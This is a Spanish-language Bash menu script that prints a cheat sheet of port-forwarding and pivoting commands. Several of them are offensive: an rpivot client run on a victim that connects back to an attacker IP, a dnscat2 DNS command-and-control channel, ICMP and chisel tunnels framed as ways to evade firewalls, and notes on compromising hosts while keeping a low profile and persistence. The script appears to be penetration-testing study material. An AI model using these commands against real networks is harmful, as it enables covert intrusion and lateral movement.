#!/bin/bash

# =============================================================================
# Script: pivoting.sh
# Descripción: Herramienta para implementación de port forwarding y pivoting
# Autor: Oliver
# Fecha: 2025
# =============================================================================

# Colores para el menú
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# =============================================================================
# Funciones de utilidad
# =============================================================================

# Función para mostrar mensajes de error
show_error() {
    echo -e "${RED}Error: $1${NC}"
}

# Función para mostrar mensajes de éxito
show_success() {
    echo -e "${GREEN}Éxito: $1${NC}"
}

# Función para mostrar mensajes informativos
show_info() {
    echo -e "${BLUE}Info: $1${NC}"
}

# Función para mostrar mensajes de advertencia
show_warning() {
    echo -e "${YELLOW}Advertencia: $1${NC}"
}

# Función para limpiar la pantalla
clear_screen() {
    clear
}

# Función para esperar entrada del usuario
wait_for_enter() {
    read -p "Presione Enter para continuar..."
}

# =============================================================================
# Funciones de menú
# =============================================================================

# Función para mostrar el menú principal
show_menu() {
    clear_screen
    echo -e "${BLUE}=== HelpMemory - Port Forwarding y Pivoting ===${NC}"
    echo -e "${YELLOW}Seleccione una opción:${NC}"
    echo -e "${GREEN}1.${NC} Port Forwarding"
    echo -e "${GREEN}2.${NC} Pivoting"
    echo -e "${GREEN}3.${NC} Salir"
    echo
    echo -n "Seleccione una opción: "
}

# Función para mostrar el menú de Port Forwarding
show_port_forwarding_menu() {
    clear_screen
    echo -e "${BLUE}=== Port Forwarding ===${NC}"
    echo -e "${YELLOW}Seleccione el método:${NC}"
    echo -e "${GREEN}1.${NC} SSH Local Forwarding (-L)"
    echo -e "${GREEN}2.${NC} SSH Remote Forwarding (-R)"
    echo -e "${GREEN}3.${NC} SSH Dynamic Forwarding (-D)"
    echo -e "${GREEN}4.${NC} Socat Forwarding"
    echo -e "${GREEN}5.${NC} Chisel Forwarding"
    echo -e "${GREEN}6.${NC} Plink Forwarding"
    echo -e "${GREEN}7.${NC} Windows Netsh Forwarding"
    echo -e "${GREEN}8.${NC} DNS Tunneling (Dnscat2)"
    echo -e "${GREEN}9.${NC} ICMP Tunneling (ptunnel-ng)"
    echo -e "${GREEN}10.${NC} SocksOverRDP"
    echo -e "${GREEN}11.${NC} Volver al menú principal"
    echo
    echo -n "Seleccione una opción: "
}

# Función para mostrar el menú de Pivoting
show_pivoting_menu() {
    clear_screen
    echo -e "${BLUE}=== Pivoting ===${NC}"
    echo -e "${YELLOW}Seleccione el método:${NC}"
    echo -e "${GREEN}1.${NC} SSHuttle"
    echo -e "${GREEN}2.${NC} Proxychains"
    echo -e "${GREEN}3.${NC} Metasploit Autoroute"
    echo -e "${GREEN}4.${NC} rpivot"
    echo -e "${GREEN}5.${NC} Gigolo"
    echo -e "${GREEN}6.${NC} Metodologías de Pivoting en Escenarios Reales"
    echo -e "${GREEN}7.${NC} Volver al menú principal"
    echo
    echo -n "Seleccione una opción: "
}

# =============================================================================
# Funciones de implementación
# =============================================================================

# Función para implementar SSH Local Forwarding
implement_ssh_local_forwarding() {
    echo -e "${BLUE}=== SSH Local Forwarding ===${NC}"
    echo -e "${YELLOW}¿Qué es SSH Local Forwarding?${NC}"
    echo "Permite redirigir un puerto local a un puerto remoto a través de SSH."
    echo

    echo -e "${GREEN}Comandos básicos:${NC}"
    echo "1. Forwarding simple:"
    echo "ssh -L 8080:localhost:80 usuario@servidor"
    echo
    echo "2. Forwarding a otro host:"
    echo "ssh -L 8080:host_remoto:80 usuario@servidor"
    echo
    echo "3. Forwarding con puerto específico:"
    echo "ssh -L 8080:localhost:80 -p 2222 usuario@servidor"
    echo
    echo "4. Múltiples forwardings:"
    echo "ssh -L 8080:localhost:80 -L 8443:localhost:443 usuario@servidor"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. El puerto local debe estar disponible"
    echo "2. Se requiere acceso SSH al servidor"
    echo "3. El tráfico está encriptado"
    echo "4. Útil para acceder a servicios internos"
}

# Función para implementar SSH Remote Forwarding
implement_ssh_remote_forwarding() {
    echo -e "${BLUE}=== SSH Remote Forwarding ===${NC}"
    echo -e "${YELLOW}¿Qué es SSH Remote Forwarding?${NC}"
    echo "Permite redirigir un puerto remoto a un puerto local a través de SSH."
    echo

    echo -e "${GREEN}Comandos básicos:${NC}"
    echo "1. Forwarding simple:"
    echo "ssh -R 8080:localhost:80 usuario@servidor"
    echo
    echo "2. Forwarding a otro host:"
    echo "ssh -R 8080:host_local:80 usuario@servidor"
    echo
    echo "3. Forwarding con puerto específico:"
    echo "ssh -R 8080:localhost:80 -p 2222 usuario@servidor"
    echo
    echo "4. Múltiples forwardings:"
    echo "ssh -R 8080:localhost:80 -R 8443:localhost:443 usuario@servidor"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. El puerto remoto debe estar disponible"
    echo "2. Se requiere acceso SSH al servidor"
    echo "3. El tráfico está encriptado"
    echo "4. Útil para exponer servicios locales"
}

# Función para implementar SSH Dynamic Forwarding
implement_ssh_dynamic_forwarding() {
    echo -e "${BLUE}=== SSH Dynamic Forwarding ===${NC}"
    echo -e "${YELLOW}¿Qué es SSH Dynamic Forwarding?${NC}"
    echo "Crea un proxy SOCKS local que enruta todo el tráfico a través de SSH."
    echo

    echo -e "${GREEN}Comandos básicos:${NC}"
    echo "1. Forwarding dinámico simple:"
    echo "ssh -D 9050 usuario@servidor"
    echo
    echo "2. Forwarding con puerto específico:"
    echo "ssh -D 9050 -p 2222 usuario@servidor"
    echo
    echo "3. Configuración de proxychains:"
    echo "socks4 127.0.0.1 9050"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Crea un proxy SOCKS local"
    echo "2. Se requiere acceso SSH al servidor"
    echo "3. El tráfico está encriptado"
    echo "4. Útil para enrutar todo el tráfico"
}

# Función para implementar Chisel Forwarding
implement_chisel_forwarding() {
    echo -e "${BLUE}=== Chisel Forwarding ===${NC}"
    echo -e "${YELLOW}¿Qué es Chisel?${NC}"
    echo "Herramienta de túnel TCP/UDP sobre HTTP con encriptación SSH."
    echo

    echo -e "${GREEN}Comandos básicos:${NC}"
    echo "1. Iniciar servidor:"
    echo "./chisel server -p 8080 --reverse"
    echo
    echo "2. Cliente local forwarding:"
    echo "./chisel client SERVER_IP:8080 R:8080:localhost:80"
    echo
    echo "3. Cliente remote forwarding:"
    echo "./chisel client SERVER_IP:8080 8080:localhost:80"
    echo
    echo "4. Cliente dynamic forwarding:"
    echo "./chisel client SERVER_IP:8080 socks"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Requiere permisos de ejecución"
    echo "2. Soporta múltiples tipos de forwarding"
    echo "3. El tráfico está encriptado"
    echo "4. Útil para evadir firewalls"
}

# Función para implementar Socat Forwarding
implement_socat_forwarding() {
    echo -e "${BLUE}=== Socat Forwarding ===${NC}"
    echo -e "${YELLOW}¿Qué es Socat?${NC}"
    echo "Herramienta multipropósito para establecer conexiones bidireccionales."
    echo

    echo -e "${GREEN}Comandos básicos:${NC}"
    echo "1. Local forwarding:"
    echo "socat TCP-LISTEN:8080,fork TCP:localhost:80"
    echo
    echo "2. Remote forwarding:"
    echo "socat TCP-LISTEN:8080,fork TCP:REMOTE_IP:80"
    echo
    echo "3. UDP forwarding:"
    echo "socat UDP-LISTEN:53,fork UDP:REMOTE_IP:53"
    echo
    echo "4. SSL forwarding:"
    echo "socat OPENSSL-LISTEN:443,cert=server.pem TCP:localhost:80"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Soporta múltiples protocolos"
    echo "2. Puede encriptar el tráfico"
    echo "3. Útil para debugging"
    echo "4. Flexible y potente"
}

# Función para implementar SocksOverRDP
implement_socks_over_rdp() {
    echo -e "${BLUE}=== SocksOverRDP ===${NC}"
    echo -e "${YELLOW}¿Qué es SocksOverRDP?${NC}"
    echo "Crea un túnel SOCKS a través de una conexión RDP."
    echo

    echo -e "${GREEN}Configuración:${NC}"
    echo "1. Registrar plugin:"
    echo "regsvr32.exe SocksOverRDP-Plugin.dll"
    echo
    echo "2. Iniciar servidor:"
    echo "SocksOverRDP-Server.exe"
    echo
    echo "3. Configurar Proxifier:"
    echo "SOCKS5 127.0.0.1 1080"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Requiere Windows"
    echo "2. Necesita permisos de administrador"
    echo "3. Útil para pivoting en redes Windows"
    echo "4. Integración con RDP"
}

# Función para implementar SSHuttle
implement_sshuttle() {
    echo -e "${BLUE}=== SSHuttle ===${NC}"
    echo -e "${YELLOW}¿Qué es SSHuttle?${NC}"
    echo "Crea un túnel SSH que simula una VPN."
    echo

    echo -e "${GREEN}Comandos básicos:${NC}"
    echo "1. Túnel básico:"
    echo "sshuttle -r usuario@servidor 192.168.1.0/24"
    echo
    echo "2. Túnel con puerto específico:"
    echo "sshuttle -r usuario@servidor:2222 192.168.1.0/24"
    echo
    echo "3. Túnel con detección automática:"
    echo "sshuttle -r usuario@servidor -N"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Requiere Python"
    echo "2. Necesita permisos de root"
    echo "3. Enruta todo el tráfico"
    echo "4. No requiere configuración en el servidor"
}

# Función para implementar Proxychains
implement_proxychains() {
    echo -e "${BLUE}=== Proxychains ===${NC}"
    echo -e "${YELLOW}¿Qué es Proxychains?${NC}"
    echo "Herramienta para forzar aplicaciones a usar proxies."
    echo

    echo -e "${GREEN}Configuración:${NC}"
    echo "1. Editar /etc/proxychains.conf:"
    echo "socks4 127.0.0.1 9050"
    echo
    echo "2. Uso básico:"
    echo "proxychains nmap -sT -p- 192.168.1.1"
    echo
    echo "3. Uso con otras herramientas:"
    echo "proxychains curl http://192.168.1.1"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Soporta múltiples tipos de proxy"
    echo "2. Útil para enrutar herramientas"
    echo "3. Fácil de configurar"
    echo "4. Compatible con muchas aplicaciones"
}

# Función para implementar Metasploit Autoroute
implement_metasploit_autoroute() {
    echo -e "${BLUE}=== Metasploit Autoroute ===${NC}"
    echo -e "${YELLOW}¿Qué es Metasploit Autoroute?${NC}"
    echo "Módulo de Metasploit para enrutar tráfico a través de sesiones."
    echo

    echo -e "${GREEN}Comandos básicos:${NC}"
    echo "1. Agregar ruta:"
    echo "route add 192.168.1.0/24 1"
    echo
    echo "2. Ver rutas:"
    echo "route print"
    echo
    echo "3. Eliminar ruta:"
    echo "route del 192.168.1.0/24"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Requiere sesión de Metasploit"
    echo "2. Útil para pivoting en pentesting"
    echo "3. Integración con otros módulos"
    echo "4. Automatización de rutas"
}

# Función para implementar Plink Forwarding
implement_plink() {
    echo -e "${BLUE}=== Plink Forwarding ===${NC}"
    echo -e "${YELLOW}¿Qué es Plink?${NC}"
    echo "Plink (PuTTY Link) es una versión de línea de comandos de PuTTY que permite"
    echo "crear túneles SSH de manera eficiente. Es especialmente útil en sistemas"
    echo "Windows para establecer conexiones seguras y túneles."
    echo

    echo -e "${GREEN}Comandos básicos:${NC}"
    echo "1. Local Forwarding:"
    echo "plink -L 8080:localhost:80 usuario@servidor"
    echo
    echo "2. Remote Forwarding:"
    echo "plink -R 8080:localhost:80 usuario@servidor"
    echo
    echo "3. Dynamic Forwarding:"
    echo "plink -D 9050 usuario@servidor"
    echo
    echo "4. Usando archivo de clave:"
    echo "plink -i ruta/a/clave.ppk -L 8080:localhost:80 usuario@servidor"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Requiere PuTTY instalado"
    echo "2. Útil en sistemas Windows"
    echo "3. Soporta autenticación por clave"
    echo "4. Compatible con todos los tipos de forwarding"
}

# Función para implementar Windows Netsh Forwarding
implement_netsh() {
    echo -e "${BLUE}=== Windows Netsh Forwarding ===${NC}"
    echo -e "${YELLOW}¿Qué es Netsh?${NC}"
    echo "Netsh (Network Shell) es una herramienta de línea de comandos de Windows"
    echo "que permite configurar y monitorear dispositivos de red en Windows."
    echo

    echo -e "${GREEN}Comandos básicos:${NC}"
    echo "1. IPv4 a IPv4:"
    echo "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=3389 connectaddress=172.16.5.25"
    echo
    echo "2. IPv4 a IPv6:"
    echo "netsh interface portproxy add v4tov6 listenport=8080 listenaddress=0.0.0.0 connectport=3389 connectaddress=2001:db8::1"
    echo
    echo "3. Ver reglas actuales:"
    echo "netsh interface portproxy show all"
    echo
    echo "4. Eliminar regla:"
    echo "netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Requiere Windows 7 o superior"
    echo "2. Necesita permisos de administrador"
    echo "3. Soporta IPv4 e IPv6"
    echo "4. Útil para reenvío de puertos en Windows"
}

# Función para implementar DNS Tunneling con Dnscat2
implement_dnscat2() {
    echo -e "${BLUE}=== DNS Tunneling con Dnscat2 ===${NC}"
    echo -e "${YELLOW}¿Qué es Dnscat2?${NC}"
    echo "Dnscat2 es una herramienta de tunelización que utiliza el protocolo DNS para"
    echo "enviar datos entre dos hosts. Utiliza un canal cifrado de Comando y Control (C&C)"
    echo "y envía datos dentro de registros TXT dentro del protocolo DNS."
    echo

    echo -e "${GREEN}Comandos básicos:${NC}"
    echo "1. Iniciar servidor:"
    echo "ruby dnscat2.rb --dns host=IP_DNS,port=53,domain=dominio.com --no-cache"
    echo
    echo "2. Cliente Windows (PowerShell):"
    echo "Import-Module .\dnscat2.ps1"
    echo "Start-Dnscat2 -DNSserver IP_DNS -Domain dominio.com -PreSharedSecret CLAVE"
    echo
    echo "3. Cliente Linux:"
    echo "./dnscat2 dominio.com"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Requiere Ruby y Bundler"
    echo "2. Necesita acceso a un servidor DNS"
    echo "3. Útil para evadir firewalls"
    echo "4. El tráfico está encriptado"
}

# Función para implementar ICMP Tunneling con ptunnel-ng
implement_ptunnel() {
    echo -e "${BLUE}=== ICMP Tunneling con ptunnel-ng ===${NC}"
    echo -e "${YELLOW}¿Qué es ptunnel-ng?${NC}"
    echo "ptunnel-ng es una herramienta que permite crear túneles ICMP, encapsulando"
    echo "tráfico dentro de paquetes ICMP (ping). Es especialmente útil para evadir"
    echo "firewalls que permiten tráfico ICMP pero bloquean otros protocolos."
    echo

    echo -e "${GREEN}Comandos básicos:${NC}"
    echo "1. Iniciar servidor:"
    echo "sudo ./ptunnel-ng -rIP_DESTINO -R3389"
    echo
    echo "2. Iniciar cliente:"
    echo "sudo ./ptunnel-ng -pIP_SERVIDOR -l3388 -rIP_DESTINO -R3389"
    echo
    echo "3. Verificar conexión:"
    echo "telnet 127.0.0.1 3388"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Requiere permisos de administrador"
    echo "2. El firewall debe permitir ICMP"
    echo "3. Útil para evadir firewalls"
    echo "4. Encapsula tráfico TCP en ICMP"
}

# Función para implementar Pivoting con rpivot
implement_pivoting() {
    echo -e "${BLUE}=== Pivoting con rpivot ===${NC}"
    echo -e "${YELLOW}¿Qué es rpivot?${NC}"
    echo "rpivot es una herramienta especializada para realizar pivoting de manera"
    echo "eficiente y segura. Permite crear túneles SSH inversos a través de hosts"
    echo "comprometidos, facilitando el acceso a redes internas."
    echo

    echo -e "${GREEN}Arquitectura:${NC}"
    echo "1. Servidor (Máquina Atacante):"
    echo "   - Escucha conexiones entrantes"
    echo "   - Gestiona las conexiones de pivoting"
    echo "   - Debe ser accesible desde la víctima"
    echo
    echo "2. Cliente (Máquina Víctima):"
    echo "   - Inicia la conexión al servidor"
    echo "   - Actúa como punto de pivote"
    echo "   - Debe tener Python instalado"
    echo

    echo -e "${GREEN}Comandos básicos:${NC}"
    echo "1. En la máquina atacante (servidor):"
    echo "   python server.py --server-port 9999 --server-ip 0.0.0.0"
    echo "   # 0.0.0.0 permite conexiones desde cualquier IP"
    echo
    echo "2. En la máquina víctima (cliente):"
    echo "   python client.py --server-ip IP_ATACANTE --server-port 9999"
    echo "   # IP_ATACANTE es la IP de tu máquina atacante"
    echo
    echo "3. Configurar proxychains en la máquina atacante:"
    echo "   # Editar /etc/proxychains.conf"
    echo "   socks4 127.0.0.1 1080"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Requiere Python en ambas máquinas"
    echo "2. El servidor debe ser accesible desde la víctima"
    echo "3. Útil para pivoting en redes"
    echo "4. Soporta múltiples conexiones"
    echo "5. El tráfico está encriptado"
    echo
    echo -e "${YELLOW}Consideraciones de seguridad:${NC}"
    echo "1. Asegúrate de que el puerto del servidor esté abierto"
    echo "2. Considera usar un puerto no estándar"
    echo "3. Verifica que la conexión sea estable"
    echo "4. Monitorea el tráfico de red"
}

# Función para implementar Gigolo
implement_gigolo() {
    echo -e "${BLUE}=== Gigolo ===${NC}"
    echo -e "${YELLOW}¿Qué es Gigolo?${NC}"
    echo "Gigolo es una herramienta gráfica para gestionar conexiones remotas"
    echo "y túneles SSH. Permite crear y gestionar conexiones de manera"
    echo "intuitiva a través de una interfaz gráfica."
    echo

    echo -e "${GREEN}Características principales:${NC}"
    echo "1. Interfaz gráfica intuitiva"
    echo "2. Gestión de conexiones SSH"
    echo "3. Soporte para túneles locales y remotos"
    echo "4. Gestión de claves SSH"
    echo

    echo -e "${GREEN}Uso básico:${NC}"
    echo "1. Instalación:"
    echo "sudo apt-get install gigolo"
    echo
    echo "2. Configuración de conexión:"
    echo "- Abrir Gigolo"
    echo "- Click en 'Conectar'"
    echo "- Seleccionar 'SSH'"
    echo "- Configurar host, usuario y puerto"
    echo
    echo "3. Configuración de túnel:"
    echo "- Seleccionar 'Túnel'"
    echo "- Configurar puerto local y remoto"
    echo "- Activar 'Reenviar puerto'"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Requiere entorno gráfico"
    echo "2. Ideal para usuarios que prefieren GUI"
    echo "3. Soporta múltiples conexiones"
    echo "4. Útil para gestión de túneles SSH"
}

# Función para implementar Metodologías de Pivoting en Escenarios Reales
implement_real_world_pivoting() {
    echo -e "${BLUE}=== Metodologías de Pivoting en Escenarios Reales ===${NC}"
    echo -e "${YELLOW}¿Qué son las metodologías de pivoting?${NC}"
    echo "Son técnicas y estrategias utilizadas para moverse lateralmente"
    echo "a través de una red comprometida, permitiendo acceder a sistemas"
    echo "que no son directamente accesibles desde el exterior."
    echo

    echo -e "${GREEN}Metodologías comunes:${NC}"
    echo "1. Pivoting de Capa 2:"
    echo "   - ARP Spoofing"
    echo "   - MAC Flooding"
    echo "   - VLAN Hopping"
    echo
    echo "2. Pivoting de Capa 3:"
    echo "   - IP Forwarding"
    echo "   - Túneles SSH"
    echo "   - VPNs"
    echo
    echo "3. Pivoting de Capa 7:"
    echo "   - Proxies"
    echo "   - Túneles DNS"
    echo "   - Túneles HTTP/HTTPS"
    echo

    echo -e "${GREEN}Escenarios comunes:${NC}"
    echo "1. Red DMZ:"
    echo "   - Comprometer servidor web"
    echo "   - Establecer túnel SSH"
    echo "   - Acceder a red interna"
    echo
    echo "2. Red Corporativa:"
    echo "   - Comprometer estación de trabajo"
    echo "   - Elevar privilegios"
    echo "   - Moverse a servidores"
    echo
    echo "3. Red Cloud:"
    echo "   - Comprometer instancia"
    echo "   - Acceder a metadatos"
    echo "   - Moverse entre regiones"
    echo

    echo -e "${YELLOW}Consideraciones importantes:${NC}"
    echo "1. Mantener bajo perfil"
    echo "2. Documentar rutas"
    echo "3. Mantener persistencia"
    echo "4. Considerar impacto"
}

# =============================================================================
# Bucle principal
# =============================================================================

main() {
    while true; do
        show_menu
        read -r option

        case $option in
            1)
                while true; do
                    show_port_forwarding_menu
                    read -r pf_option

                    case $pf_option in
                        1) implement_ssh_local_forwarding ;;
                        2) implement_ssh_remote_forwarding ;;
                        3) implement_ssh_dynamic_forwarding ;;
                        4) implement_socat_forwarding ;;
                        5) implement_chisel_forwarding ;;
                        6) implement_plink ;;
                        7) implement_netsh ;;
                        8) implement_dnscat2 ;;
                        9) implement_ptunnel ;;
                        10) implement_socks_over_rdp ;;
                        11) break ;;
                        *) show_error "Opción inválida" ;;
                    esac

                    wait_for_enter
                done
                ;;
            2)
                while true; do
                    show_pivoting_menu
                    read -r pivoting_option

                    case $pivoting_option in
                        1) implement_sshuttle ;;
                        2) implement_proxychains ;;
                        3) implement_metasploit_autoroute ;;
                        4) implement_pivoting ;;
                        5) implement_gigolo ;;
                        6) implement_real_world_pivoting ;;
                        7) break ;;
                        *) show_error "Opción inválida" ;;
                    esac

                    wait_for_enter
                done
                ;;
            3)
                show_success "Saliendo..."
                exit 0
                ;;
            *)
                show_error "Opción inválida"
                ;;
        esac

        wait_for_enter
    done
}

# Ejecutar el programa principal
main
